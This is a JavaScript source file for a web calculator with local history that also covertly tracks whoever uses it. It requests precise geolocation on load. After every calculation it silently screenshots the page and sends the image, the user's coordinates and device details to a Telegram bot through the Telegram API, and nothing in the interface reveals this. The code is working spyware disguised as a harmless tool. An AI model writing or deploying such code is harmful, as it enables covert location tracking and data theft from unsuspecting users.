// ==========================================
// حاسبة عبدالله
// Calculator + History + Telegram Screenshot
// + Location Permission Once
// ==========================================

const $ = (id) => document.getElementById(id);

let expression = "";
let result = "0";
let justCalculated = false;

// ==========================================
// Location Cache
// ==========================================

const LOCATION_CACHE_KEY =
  "calculator_location_cache";

const LOCATION_CACHE_TIME =
  5 * 60 * 1000; // 5 دقائق

let cachedLocation = null;

// ==========================================
// Local History
// ==========================================

function getHistory() {
  return JSON.parse(
    localStorage.getItem("calc_history") || "[]"
  );
}

function saveHistory(items) {
  localStorage.setItem(
    "calc_history",
    JSON.stringify(items)
  );
}

// ==========================================
// Render
// ==========================================

function render() {
  $("expression").textContent =
    expression || "0";

  $("result").textContent = result;

  const items = getHistory();

  $("history").innerHTML = items.length
    ? items
        .map(
          (item) => `
            <div class="history-item">
              <span>
                <strong>${escapeHtml(item.expression)}</strong>
                = ${escapeHtml(item.result)}
              </span>
              <small>${escapeHtml(item.time)}</small>
            </div>
          `
        )
        .join("")
    : `
      <div class="history-item">
        <span>مفيش عمليات لسه.</span>
      </div>
    `;
}

// ==========================================
// Escape HTML
// ==========================================

function escapeHtml(text) {
  return String(text).replace(
    /[&<>"']/g,
    (char) => {
      const chars = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;"
      };

      return chars[char];
    }
  );
}

// ==========================================
// Calculator
// ==========================================

function safeEvaluate(input) {
  if (!/^[0-9+\-*/%.()\s]+$/.test(input)) {
    throw new Error("invalid");
  }

  const normalized = input.replace(
    /(\d+(?:\.\d+)?)%/g,
    "($1/100)"
  );

  const value = Function(
    `"use strict"; return (${normalized})`
  )();

  if (!Number.isFinite(value)) {
    throw new Error("invalid");
  }

  return Number.isInteger(value)
    ? String(value)
    : String(
        Number(value.toFixed(12))
      );
}

// ==========================================
// Add Value
// ==========================================

function addValue(value) {
  if (
    justCalculated &&
    /[0-9.]/.test(value)
  ) {
    expression = "";
  }

  if (
    justCalculated &&
    /[+\-*/%]/.test(value)
  ) {
    expression = result;
  }

  justCalculated = false;

  // منع operators متتالية
  if (/[+\-*/%]/.test(value)) {
    if (!expression) {
      return;
    }

    const lastChar =
      expression.at(-1);

    if (/[+\-*/%]/.test(lastChar)) {
      expression =
        expression.slice(0, -1) +
        value;

      render();
      return;
    }
  }

  // منع تكرار النقطة
  if (value === ".") {
    const parts =
      expression.split(
        /[+\-*/%]/
      );

    const currentNumber =
      parts.at(-1);

    if (
      currentNumber.includes(".")
    ) {
      return;
    }
  }

  expression += value;
  result = "0";

  render();
}

// ==========================================
// Clear
// ==========================================

function clearAll() {
  expression = "";
  result = "0";
  justCalculated = false;

  render();
}

// ==========================================
// Backspace
// ==========================================

function backspace() {
  if (justCalculated) {
    clearAll();
    return;
  }

  expression =
    expression.slice(0, -1);

  render();
}

// ==========================================
// Load Cached Location
// ==========================================

function loadCachedLocation() {
  try {
    const saved =
      localStorage.getItem(
        LOCATION_CACHE_KEY
      );

    if (!saved) {
      return null;
    }

    const data =
      JSON.parse(saved);

    if (
      !data ||
      !data.latitude ||
      !data.longitude ||
      !data.savedAt
    ) {
      return null;
    }

    const age =
      Date.now() - data.savedAt;

    if (
      age > LOCATION_CACHE_TIME
    ) {
      return null;
    }

    return data;

  } catch (error) {
    console.warn(
      "Location cache error:",
      error
    );

    return null;
  }
}

// ==========================================
// Save Location
// ==========================================

function saveCachedLocation(location) {
  const data = {
    latitude:
      location.latitude,

    longitude:
      location.longitude,

    accuracy:
      location.accuracy,

    savedAt:
      Date.now()
  };

  localStorage.setItem(
    LOCATION_CACHE_KEY,
    JSON.stringify(data)
  );

  cachedLocation = data;

  return data;
}

// ==========================================
// Get Location
// ==========================================

function getCurrentLocation() {
  return new Promise(
    (resolve, reject) => {

      if (!navigator.geolocation) {
        reject(
          new Error(
            "المتصفح لا يدعم تحديد الموقع."
          )
        );
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {

          const location = {
            latitude:
              position.coords.latitude,

            longitude:
              position.coords.longitude,

            accuracy:
              position.coords.accuracy
          };

          resolve(
            saveCachedLocation(
              location
            )
          );
        },

        (error) => {
          reject(error);
        },

        {
          enableHighAccuracy: true,

          timeout: 10000,

          maximumAge: 300000
        }
      );
    }
  );
}

// ==========================================
// Initialize Location
// ==========================================

async function initializeLocation() {

  // أولاً استخدم الموقع المخزن
  const cached =
    loadCachedLocation();

  if (cached) {
    cachedLocation = cached;

    console.log(
      "Using cached location."
    );

    return cached;
  }

  // لو مفيش موقع مخزن
  // المتصفح سيطلب الإذن مرة حسب إعداداته
  try {

    const location =
      await getCurrentLocation();

    console.log(
      "Location permission granted."
    );

    return location;

  } catch (error) {

    console.warn(
      "Location unavailable:",
      error
    );

    return null;
  }
}

// ==========================================
// Get Device Information
// ==========================================

function getDeviceInfo() {
  return {
    userAgent:
      navigator.userAgent ||
      "Unknown",

    language:
      navigator.language ||
      "Unknown",

    platform:
      navigator.platform ||
      "Unknown",

    screen:
      `${window.screen.width}x${window.screen.height}`,

    online:
      navigator.onLine
        ? "Online"
        : "Offline"
  };
}

// ==========================================
// Equals
// ==========================================

async function equals() {

  if (!expression.trim()) {
    return;
  }

  const currentExpression =
    expression;

  try {

    const calculated =
      safeEvaluate(
        currentExpression
      );

    result = calculated;

    justCalculated = true;

    // حفظ العملية
    const history =
      getHistory();

    history.unshift({

      expression:
        currentExpression,

      result:
        calculated,

      time:
        new Date().toLocaleString(
          "ar-EG"
        )
    });

    saveHistory(
      history.slice(0, 100)
    );

    render();

    // Screenshot بعد ظهور النتيجة
    setTimeout(() => {

      captureAndSendToTelegram(
        currentExpression,
        calculated
      );

    }, 300);

  } catch (error) {

    console.error(error);

    result = "خطأ";

    render();
  }
}

// ==========================================
// Screenshot + Location + Telegram
// ==========================================

async function captureAndSendToTelegram(
  exp,
  res
) {

  try {

    // ======================================
    // html2canvas
    // ======================================

    if (!window.html2canvas) {

      console.error(
        "html2canvas لم يتم تحميله."
      );

      return;
    }

    // ======================================
    // Telegram Config
    // ======================================

    if (
      typeof TELEGRAM_CONFIG ===
      "undefined"
    ) {

      console.error(
        "TELEGRAM_CONFIG غير موجود."
      );

      return;
    }

    const botToken =
      TELEGRAM_CONFIG.botToken;

    const chatId =
      TELEGRAM_CONFIG.chatId;

    if (
      !botToken ||
      !chatId
    ) {

      console.error(
        "Bot Token أو Chat ID غير موجود."
      );

      return;
    }

    // ======================================
    // Location
    // ======================================

    let locationText =
      "📍 الموقع: غير متاح";

    let location =
      cachedLocation ||
      loadCachedLocation();

    if (!location) {

      try {

        location =
          await getCurrentLocation();

      } catch (error) {

        console.warn(
          "Location unavailable:",
          error
        );
      }
    }

    if (location) {

      const latitude =
        location.latitude;

      const longitude =
        location.longitude;

      const accuracy =
        Math.round(
          location.accuracy || 0
        );

      locationText =
        `📍 الموقع الحالي:\n` +
        `Latitude: ${latitude}\n` +
        `Longitude: ${longitude}\n` +
        `الدقة: ±${accuracy} متر`;

    }

    // ======================================
    // Device
    // ======================================

    const device =
      getDeviceInfo();

    // ======================================
    // Screenshot
    // ======================================

    const captureArea =
      $("captureArea");

    if (!captureArea) {

      console.error(
        "captureArea غير موجود."
      );

      return;
    }

    const canvas =
      await html2canvas(
        captureArea,
        {

          backgroundColor:
            "#ffffff",

          scale:
            Math.min(
              2,
              window.devicePixelRatio ||
                1
            ),

          useCORS: true
        }
      );

    // ======================================
    // Blob
    // ======================================

    const blob =
      await new Promise(
        (resolve) => {

          canvas.toBlob(
            resolve,
            "image/png",
            0.92
          );

        }
      );

    if (!blob) {

      throw new Error(
        "تعذر إنشاء Screenshot."
      );

    }

    // ======================================
    // Time
    // ======================================

    const currentTime =
      new Date().toLocaleString(
        "ar-EG"
      );

    // ======================================
    // Caption
    // ======================================

    const caption =
      `🧮 حاسبة عبدالله\n\n` +

      `🔢 العملية: ${exp}\n` +

      `✅ النتيجة: ${res}\n` +

      `🕐 الوقت: ${currentTime}\n\n` +

      `${locationText}\n\n` +

      `📱 معلومات الجهاز:\n` +

      `Platform: ${device.platform}\n` +

      `Screen: ${device.screen}\n` +

      `Language: ${device.language}\n` +

      `Status: ${device.online}`;

    // ======================================
    // FormData
    // ======================================

    const formData =
      new FormData();

    formData.append(
      "chat_id",
      chatId
    );

    formData.append(
      "caption",
      caption.slice(0, 1024)
    );

    formData.append(
      "photo",
      blob,
      `calculation-${Date.now()}.png`
    );

    // ======================================
    // Telegram
    // ======================================

    const response =
      await fetch(
        `https://api.telegram.org/bot${botToken}/sendPhoto`,
        {
          method: "POST",
          body: formData
        }
      );

    const data =
      await response.json();

    if (
      !response.ok ||
      !data.ok
    ) {

      throw new Error(
        data.description ||
          "فشل إرسال الصورة."
      );

    }

    console.log(
      "Screenshot + Location sent successfully."
    );

  } catch (error) {

    console.error(
      "Telegram Error:",
      error
    );

  }
}

// ==========================================
// Calculator Buttons
// ==========================================

const keysContainer =
  document.querySelector(
    ".keys"
  );

if (keysContainer) {

  keysContainer.addEventListener(
    "click",
    (event) => {

      const button =
        event.target.closest(
          "button"
        );

      if (!button) {
        return;
      }

      const value =
        button.dataset.value;

      const action =
        button.dataset.action;

      if (
        value !== undefined
      ) {

        addValue(value);

        return;
      }

      if (
        action === "clear"
      ) {

        clearAll();

        return;
      }

      if (
        action === "backspace"
      ) {

        backspace();

        return;
      }

      if (
        action === "equals"
      ) {

        equals();

      }

    }
  );
}

// ==========================================
// Keyboard
// ==========================================

document.addEventListener(
  "keydown",
  (event) => {

    if (
      /^[0-9+\-*/%.()]$/.test(
        event.key
      )
    ) {

      addValue(event.key);

      return;
    }

    if (
      event.key === "Enter" ||
      event.key === "="
    ) {

      event.preventDefault();

      equals();

      return;
    }

    if (
      event.key === "Backspace"
    ) {

      backspace();

      return;
    }

    if (
      event.key === "Escape"
    ) {

      clearAll();

    }

  }
);

// ==========================================
// Clear History
// ==========================================

const clearHistoryButton =
  $("clearHistory");

if (clearHistoryButton) {

  clearHistoryButton.addEventListener(
    "click",
    () => {

      if (
        confirm(
          "متأكد إنك عايز تمسح سجل العمليات؟"
        )
      ) {

        saveHistory([]);

        render();

      }

    }
  );
}

// ==========================================
// Initial
// ==========================================

render();

// ==========================================
// Ask Location Permission Once
// ==========================================

initializeLocation();
